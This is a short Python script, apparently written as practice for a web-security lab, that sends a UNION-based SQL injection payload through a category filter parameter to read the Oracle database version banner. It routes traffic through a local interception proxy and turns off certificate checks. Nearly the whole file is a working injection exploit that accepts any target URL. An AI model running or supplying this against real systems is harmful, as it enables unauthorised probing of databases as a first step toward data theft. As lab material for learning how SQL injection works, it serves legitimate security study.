import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_version(url):
	print("#### debugging 1")
	path = '/filter?category=Giftssss'
	print("#### debugging 2")	
	sql_payload = "' UNION select banner, null from v$version--"
	r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
	print("#### debugging 3")
	
	res = r.text
	if "Oracle Database" in res:

		print("[+] Found the Oracle database version.")
		soup = BeautifulSoup(r.text, 'html.parser')
		version = soup.body.find(text=re.compile('.*Oracle\sDatabase.*'))	
		print("[+] The Oracle database version is '%s'." % version)
		return True
	return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print("[-] Usage: %s <url>" % sys.argv[0])
		print("[-] Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Dumping the version of the database...")
	if not exploit_sqli_version(url):
		print("[-] Unable to dump the database version.")